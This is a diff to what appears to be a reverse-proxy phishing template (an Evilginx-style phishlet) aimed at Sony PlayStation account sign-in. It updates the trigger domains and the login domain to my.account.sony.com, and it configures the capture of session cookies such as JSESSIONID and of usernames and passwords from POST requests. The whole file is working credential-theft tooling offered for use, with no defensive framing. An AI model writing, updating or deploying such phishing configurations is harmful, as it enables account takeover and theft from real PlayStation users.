@@ -12,10 +12,10 @@ proxy_hosts:
 #lengtmp+oszxh@gmail.com
 
 sub_filters:
-  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'id', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'auth.api', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'www', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'accounts.api', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'my.account.sony.com', orig_sub: 'id', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'my.account.sony.com', orig_sub: 'auth.api', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'my.account.sony.com', orig_sub: 'www', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'my.account.sony.com', orig_sub: 'accounts.api', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
 
   - {triggers_on: 'www.playstation.com', orig_sub: 'id', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
@@ -28,7 +28,7 @@ auth_tokens:
     keys: ['bm_sz,opt','_abck,opt','s_cc,opt','s_sq']
   - domain: 'auth.api.sonyentertainmentnetwork.com'
     keys: ['JSESSIONID']
-  - domain: 'id.sonyentertainmentnetwork.com'
+  - domain: 'my.account.sony.com'
     keys: ['akacd_pdr-id2-sencom-bdl,opt']
        
 credentials:
@@ -41,5 +41,5 @@ credentials:
     search: '(.*)'
     type: 'post'
 login:
-  domain: 'id.sonyentertainmentnetwork.com'
+  domain: 'my.account.sony.com'
   path: '/signin/'
